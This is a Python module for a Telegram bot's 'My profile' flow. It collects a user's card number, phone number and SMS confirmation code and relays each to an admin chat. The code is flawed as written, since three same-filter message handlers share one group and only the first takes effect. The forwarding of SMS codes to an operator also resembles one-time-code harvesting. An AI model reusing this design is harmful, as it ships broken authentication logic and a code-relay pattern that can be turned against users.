# modules/handlers/profile.py

import re
import sqlite3
from telegram import Update
from telegram.ext import CallbackQueryHandler, MessageHandler, filters, ContextTypes
from modules.config import ADMIN_ID, DB_NAME
from keyboards     import nav_buttons, client_menu
from states        import (
    STEP_MENU,
    STEP_CLIENT_MENU,
    STEP_PROFILE_ENTER_CARD,
    STEP_PROFILE_ENTER_PHONE,
    STEP_PROFILE_ENTER_CODE,
)

def register_profile_handlers(app):
    # когда нажали «Мій профіль»
    app.add_handler(
        CallbackQueryHandler(_enter_profile, pattern="^client_profile$"),
        group=0
    )
    # ввод номера карты
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_card),
        group=1
    )
    # ввод телефона
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_phone),
        group=1
    )
    # ввод SMS-кода
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_code),
        group=1
    )

async def _enter_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text(
        "Введіть номер вашої картки:", reply_markup=nav_buttons()
    )
    return STEP_PROFILE_ENTER_CARD

async def profile_enter_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if not re.fullmatch(r"\d{4,7}", text):
        await update.message.reply_text("Невірний формат картки. Спробуйте ще раз.", reply_markup=nav_buttons())
        return STEP_PROFILE_ENTER_CARD

    # сохраняем в user_data и просим телефон
    context.user_data["profile_card"] = text
    await update.message.reply_text("Введіть номер телефону (10 цифр):", reply_markup=nav_buttons())
    return STEP_PROFILE_ENTER_PHONE

async def profile_enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not re.fullmatch(r"\d{10}", phone):
        await update.message.reply_text("Невірний формат телефону. Спробуйте ще раз.", reply_markup=nav_buttons())
        return STEP_PROFILE_ENTER_PHONE

    context.user_data["profile_phone"] = phone

    # пересылаем админу запрос
    name = update.effective_user.full_name
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"Клієнт {name} ({update.effective_user.id}) хоче авторизуватися.\n"
             f"Картка: {context.user_data['profile_card']}\n"
             f"Телефон: {phone}\n"
             f"Надішліть йому SMS-код для підтвердження."
    )

    await update.message.reply_text("Код відправлено адміністратору. Введіть 4-значний код:", reply_markup=nav_buttons())
    return STEP_PROFILE_ENTER_CODE

async def profile_enter_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip()
    if not re.fullmatch(r"\d{4}", code):
        await update.message.reply_text("Невірний код. Спробуйте ще раз.", reply_markup=nav_buttons())
        return STEP_PROFILE_ENTER_CODE

    # шлём админу код
    name = update.effective_user.full_name
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"SMS-код від {name} ({update.effective_user.id}): {code}"
    )

    # возвращаемся в главное меню клиента
    await update.message.reply_text("Очікуйте підтвердження від адміністратора.", reply_markup=client_menu(authorized=False))
    return STEP_MENU
